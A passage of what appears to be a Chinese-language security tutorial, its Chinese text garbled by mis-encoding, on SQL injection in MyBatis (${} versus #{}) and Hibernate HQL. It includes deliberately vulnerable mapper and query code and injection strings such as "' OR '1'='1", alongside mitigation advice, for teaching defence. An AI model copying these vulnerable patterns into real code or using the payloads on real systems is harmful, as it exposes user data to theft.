<code>$&#123;&#125;</code> ä¼ å‚çš„æ–¹å¼ä¼šç›´æ¥å°†å‚æ•°å€¼æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œè€Œä¸ä¼šç»è¿‡é¢„ç¼–è¯‘ã€‚è¿™æ„å‘³ç€å‚æ•°ä¼šè¢«è§£æä¸º SQL è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œå®¹æ˜“äº§ç”Ÿ SQL æ³¨å…¥é£é™©ã€‚</p><ul><li><strong>ä¸å®‰å…¨çš„æ–¹å¼</strong>ï¼Œä¸å»ºè®®ç”¨äºç›´æ¥å¤„ç†ç”¨æˆ·è¾“å…¥çš„å˜é‡ã€‚</li><li>ä¾‹å¦‚ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsername&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, name, age FROM user WHERE name = $&#123;name&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li>å½“ç”¨æˆ·è¾“å…¥ <code>name = &quot;&#39;aaaa&#39; OR 1=1&quot;</code> æ—¶ï¼ŒMyBatis ä¼šå°†å…¶ç›´æ¥æ‹¼æ¥åˆ° SQL ä¸­ï¼Œç”Ÿæˆ <code>SELECT id, name, age FROM user WHERE name = &#39;aaaa&#39; OR 1=1</code>ã€‚</li><li>ç”±äº <code>OR 1=1</code> å§‹ç»ˆä¸ºçœŸï¼ŒSQL è¯­å¥å°†è¿”å›æ‰€æœ‰æ•°æ®ï¼Œä»è€Œå¯¼è‡´ SQL æ³¨å…¥ã€‚</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderbyInjection</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span>;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user where id in ($&#123;params&#125;)&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">inInjection</span><span class="params">(<span class="meta">@Param(&quot;params&quot;)</span>String params)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">likeInjection</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line"><span class="comment">//MybatisæŸ¥è¯¢SQLè¯­å¥çš„å¦ä¸€ç§ä½¿ç”¨æ³¨è§£æ–¹å¼ï¼Œè¿™ä¹Ÿæ˜¯å­˜åœ¨SQLæ³¨å…¥çš„ã€‚</span></span><br><span class="line"><span class="comment">//@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line"><span class="comment">//List&lt;User&gt; likeInjection(@Param(&quot;username&quot;) String username);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.sqlinjection.mybatisinjection.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.example.sqlinjection.mybatisinjection.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.Integer&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;NUMERIC&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbyInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from user order by $&#123;sort&#125; asc</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;likeInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from user where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-SQL-æ³¨å…¥é£é™©åˆ†æ"><a href="#3-SQL-æ³¨å…¥é£é™©åˆ†æ" class="headerlink" title="3. SQL æ³¨å…¥é£é™©åˆ†æ"></a>3. SQL æ³¨å…¥é£é™©åˆ†æ</h3><h4 id="ä½¿ç”¨-çš„å®‰å…¨æ€§"><a href="#ä½¿ç”¨-çš„å®‰å…¨æ€§" class="headerlink" title="ä½¿ç”¨ #{} çš„å®‰å…¨æ€§"></a>ä½¿ç”¨ <code>#&#123;&#125;</code> çš„å®‰å…¨æ€§</h4><ul><li>å½“æˆ‘ä»¬åœ¨ MyBatis ä¸­ä½¿ç”¨ <code>#&#123;&#125;</code> ä¼ å‚æ—¶ï¼ŒMyBatis ä¼šå°†å‚æ•°è½¬æ¢ä¸º SQL è¯­å¥çš„ <code>?</code> å ä½ç¬¦ï¼Œå¹¶åœ¨æ‰§è¡Œæ—¶ç»‘å®šå®é™…çš„å‚æ•°å€¼ã€‚è¿™ç§æ–¹å¼ç¡®ä¿äº†ç”¨æˆ·è¾“å…¥å’Œ SQL è¯­å¥çš„åˆ†ç¦»ï¼Œå› æ­¤å³ä½¿ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®ï¼Œä¹Ÿä¸ä¼šå¯¹ SQL è¯­å¥çš„é€»è¾‘äº§ç”Ÿå½±å“ã€‚</li><li>ä¾‹å¦‚ï¼Œå½“ç”¨æˆ·è¾“å…¥ <code>name = &quot;z1ng&#39; OR &#39;1&#39;=&#39;1&quot;</code>ï¼ŒSQL è¯­å¥å°†æ˜¯ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, age <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure>åœ¨æ‰§è¡Œæ—¶ï¼Œæ•°æ®åº“ä¼šå°† <code>name</code> ä½œä¸ºå‚æ•°æ¥å¤„ç†ï¼Œè€Œä¸ä¼šæ”¹å˜ SQL è¯­å¥æœ¬èº«ï¼Œä»è€Œæœ‰æ•ˆé˜²æ­¢äº† SQL æ³¨å…¥ã€‚</li></ul><h4 id="ä½¿ç”¨-çš„-SQL-æ³¨å…¥é£é™©"><a href="#ä½¿ç”¨-çš„-SQL-æ³¨å…¥é£é™©" class="headerlink" title="ä½¿ç”¨ ${} çš„ SQL æ³¨å…¥é£é™©"></a>ä½¿ç”¨ <code>$&#123;&#125;</code> çš„ SQL æ³¨å…¥é£é™©</h4><ul><li>ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šè®© SQL è¯­å¥å˜å¾—æå…¶è„†å¼±ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ¶æ„æ„é€ çš„è¾“å…¥æ¥æ“çºµæŸ¥è¯¢é€»è¾‘ã€‚</li><li>ä¾‹å¦‚ï¼Œåœ¨ MyBatis ä¸­ï¼Œå¦‚æœä½¿ç”¨ <code>$&#123;name&#125;</code>ï¼Œåˆ™è¾“å…¥ <code>&quot;z1ng&#39; OR &#39;1&#39;=&#39;1&quot;</code> ä¼šä½¿ SQL è¯­å¥å˜ä¸ºï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, age <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;z1ng&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>SQL è¯­å¥çš„é€»è¾‘å·²è¢«ç¯¡æ”¹ï¼Œå°†æŸ¥è¯¢æ‰€æœ‰æ•°æ®ï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ã€‚</li></ul></li></ul><h3 id="6-MyBatis-ä½¿ç”¨ä¸­çš„å®‰å…¨å»ºè®®"><a href="#6-MyBatis-ä½¿ç”¨ä¸­çš„å®‰å…¨å»ºè®®" class="headerlink" title="6. MyBatis ä½¿ç”¨ä¸­çš„å®‰å…¨å»ºè®®"></a>6. MyBatis ä½¿ç”¨ä¸­çš„å®‰å…¨å»ºè®®</h3><h4 id="6-1-é¿å…åœ¨åŠ¨æ€-SQL-ä¸­ç›´æ¥ä½¿ç”¨"><a href="#6-1-é¿å…åœ¨åŠ¨æ€-SQL-ä¸­ç›´æ¥ä½¿ç”¨" class="headerlink" title="6.1 é¿å…åœ¨åŠ¨æ€ SQL ä¸­ç›´æ¥ä½¿ç”¨ ${}"></a>6.1 é¿å…åœ¨åŠ¨æ€ SQL ä¸­ç›´æ¥ä½¿ç”¨ <code>$&#123;&#125;</code></h4><ul><li>MyBatis æ”¯æŒåŠ¨æ€ SQLï¼ˆå¦‚ <code>&lt;if&gt;</code>ã€<code>&lt;choose&gt;</code>ã€<code>&lt;where&gt;</code> ç­‰æ ‡ç­¾ï¼‰ï¼Œåœ¨æ„å»ºåŠ¨æ€ SQL æ—¶ä¹Ÿéœ€è¦ç‰¹åˆ«å°å¿ƒï¼Œé¿å…ä½¿ç”¨ <code>$&#123;&#125;</code> æ¥æ’å…¥ç”¨æˆ·è¾“å…¥ã€‚</li><li>ä¾‹å¦‚ï¼Œåœ¨ MyBatis çš„åŠ¨æ€æŸ¥è¯¢ä¸­ä½¿ç”¨ <code>#&#123;&#125;</code> å‚æ•°å¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®å®‰å…¨ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserByCondition&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username != null&quot;</span>&gt;</span></span><br><span class="line">            AND username = #&#123;username&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != null&quot;</span>&gt;</span></span><br><span class="line">            AND age = #&#123;age&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="6-2-ä½¿ç”¨-sql-æ ‡ç­¾å¤ç”¨å®‰å…¨æŸ¥è¯¢ç‰‡æ®µ"><a href="#6-2-ä½¿ç”¨-sql-æ ‡ç­¾å¤ç”¨å®‰å…¨æŸ¥è¯¢ç‰‡æ®µ" class="headerlink" title="6.2 ä½¿ç”¨ sql æ ‡ç­¾å¤ç”¨å®‰å…¨æŸ¥è¯¢ç‰‡æ®µ"></a>6.2 ä½¿ç”¨ <code>sql</code> æ ‡ç­¾å¤ç”¨å®‰å…¨æŸ¥è¯¢ç‰‡æ®µ</h4><ul><li>MyBatis æ”¯æŒå°†æŸ¥è¯¢ç‰‡æ®µå®šä¹‰åœ¨ <code>&lt;sql&gt;</code> æ ‡ç­¾ä¸­ï¼Œé¿å…å¼€å‘è€…åœ¨å¤šä¸ªä½ç½®æ‹¼æ¥ç›¸ä¼¼ SQL è¯­å¥ï¼Œæœ‰åŠ©äºè§„èŒƒåŒ– SQL æŸ¥è¯¢ç»“æ„ï¼Œé™ä½å‡ºé”™é£é™©ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;userColumns&quot;</span>&gt;</span></span><br><span class="line">    id, username, age, email</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;userColumns&quot;</span>/&gt;</span> FROM users WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Hibernate-æ¡†æ¶æ³¨å…¥"><a href="#Hibernate-æ¡†æ¶æ³¨å…¥" class="headerlink" title="Hibernate æ¡†æ¶æ³¨å…¥"></a><strong>Hibernate</strong> æ¡†æ¶æ³¨å…¥</h2><h3 id="1-Hibernate-æ¡†æ¶æ¦‚è¿°"><a href="#1-Hibernate-æ¡†æ¶æ¦‚è¿°" class="headerlink" title="1. Hibernate æ¡†æ¶æ¦‚è¿°"></a>1. Hibernate æ¡†æ¶æ¦‚è¿°</h3><p>Hibernate æ˜¯ä¸€ç§æŒä¹…å±‚æ¡†æ¶ï¼Œå®ç°äº† Java æŒä¹…åŒ– APIï¼ˆJPAï¼‰è§„èŒƒï¼Œç”¨äºåœ¨ Java ç±»å’Œæ•°æ®åº“è¡¨ä¹‹é—´è¿›è¡Œæ˜ å°„ã€‚Hibernate å…è®¸å¼€å‘è€…é€šè¿‡æ“ä½œ Java å¯¹è±¡æ¥ä¸æ•°æ®åº“äº¤äº’ï¼Œè€Œæ— éœ€ç¼–å†™åŸç”Ÿ SQL è¯­å¥ã€‚Hibernate ä¸»è¦é€šè¿‡ HQL æŸ¥è¯¢è¯­è¨€å’Œ Criteria API è¿›è¡Œå¯¹è±¡æŒä¹…åŒ–ï¼Œæ”¯æŒè‡ªåŠ¨å°† Java æ•°æ®ç±»å‹æ˜ å°„åˆ° SQL æ•°æ®ç±»å‹ã€‚</p><p>Hibernate éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ˆhibernate.cfg.xmlï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†æ•°æ®åº“è¿æ¥ä¿¡æ¯å’Œä¸€äº›åŸºæœ¬çš„ Hibernate è®¾ç½®ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hibernate-configuration</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-factory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.dialect&quot;</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.driver_class&quot;</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.url&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/mydb<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.username&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.password&quot;</span>&gt;</span>password<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.hbm2ddl.auto&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.show_sql&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-factory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ Hibernate ä¸­ï¼ŒJava ç±»é€šå¸¸ä½¿ç”¨æ³¨è§£æ¥è¡¨ç¤ºå®ä½“ï¼Œå¹¶å°†å…¶ä¸æ•°æ®åº“è¡¨ç›¸å…³è”ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ User ç±»åŠå…¶æ•°æ®åº“æ˜ å°„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GenerationType;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">// @Id æŒ‡å®šäº†ä¸»é”®ã€‚</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>  <span class="comment">// @GeneratedValue é…ç½®äº†ä¸»é”®çš„ç”Ÿæˆç­–ç•¥ã€‚</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hibernate æä¾›äº† Session å¯¹è±¡ï¼Œç”¨äºç®¡ç†å’Œæ“ä½œå®ä½“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.Session;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.SessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.cfg.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º SessionFactory</span></span><br><span class="line">        <span class="type">SessionFactory</span> <span class="variable">sessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>().configure().buildSessionFactory();</span><br><span class="line">        <span class="comment">// è·å– Session</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> sessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¼€å¯äº‹åŠ¡</span></span><br><span class="line">        session.beginTransaction();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºç”¨æˆ·</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        user.setPassword(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¿å­˜ç”¨æˆ·åˆ°æ•°æ®åº“</span></span><br><span class="line">        session.save(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æäº¤äº‹åŠ¡</span></span><br><span class="line">        session.getTransaction().commit();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…³é—­ Session</span></span><br><span class="line">        session.close();</span><br><span class="line">        sessionFactory.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hibernate æä¾›äº† HQLï¼ˆHibernate Query Languageï¼‰å’Œ Criteria API æ¥æŸ¥è¯¢æ•°æ®åº“ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HQLæŸ¥è¯¢</span></span><br><span class="line">List&lt;User&gt; users = session.createQuery(<span class="string">&quot;from User where username = :username&quot;</span>, User.class)</span><br><span class="line">                          .setParameter(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                          .getResultList();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Criteria æŸ¥è¯¢</span></span><br><span class="line"><span class="type">CriteriaBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> session.getCriteriaBuilder();</span><br><span class="line">CriteriaQuery&lt;User&gt; query = builder.createQuery(User.class);</span><br><span class="line">Root&lt;User&gt; root = query.from(User.class);</span><br><span class="line">query.select(root).where(builder.equal(root.get(<span class="string">&quot;username&quot;</span>), <span class="string">&quot;admin&quot;</span>));</span><br><span class="line">List&lt;User&gt; users = session.createQuery(query).getResultList();</span><br></pre></td></tr></table></figure><h3 id="2-HQL-ä¸-SQL-æ³¨å…¥"><a href="#2-HQL-ä¸-SQL-æ³¨å…¥" class="headerlink" title="2. HQL ä¸ SQL æ³¨å…¥"></a>2. HQL ä¸ SQL æ³¨å…¥</h3><h4 id="HQL-æ³¨å…¥ç¤ºä¾‹"><a href="#HQL-æ³¨å…¥ç¤ºä¾‹" class="headerlink" title="HQL æ³¨å…¥ç¤ºä¾‹"></a>HQL æ³¨å…¥ç¤ºä¾‹</h4><p>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†ä¸å®‰å…¨çš„ HQL æŸ¥è¯¢ï¼Œå¼€å‘è€…ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°æŸ¥è¯¢è¯­å¥ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">factory = <span class="keyword">new</span> <span class="title class_">Configuration</span>().configure().buildSessionFactory();</span><br><span class="line"><span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> factory.openSession();</span><br><span class="line"><span class="type">Transaction</span> <span class="variable">tx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    tx = session.beginTransaction();</span><br><span class="line">    <span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;</span>;</span><br><span class="line">    List&lt;User&gt; users = session.createQuery(<span class="string">&quot;FROM User WHERE name = &#x27;&quot;</span> + parameter + <span class="string">&quot;&#x27;&quot;</span>, User.class).getResultList();</span><br><span class="line">    <span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">        System.out.println(user.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    tx.commit();</span><br><span class="line">&#125; <span class="keyword">catch</span> (HibernateException e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tx != <span class="literal">null</span>) tx.rollback();</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    session.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>æ³¨å…¥é£é™©åˆ†æ</strong>ï¼š<ul><li>å˜é‡ <code>parameter</code> æ˜¯ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œå½“ç”¨æˆ·è¾“å…¥ 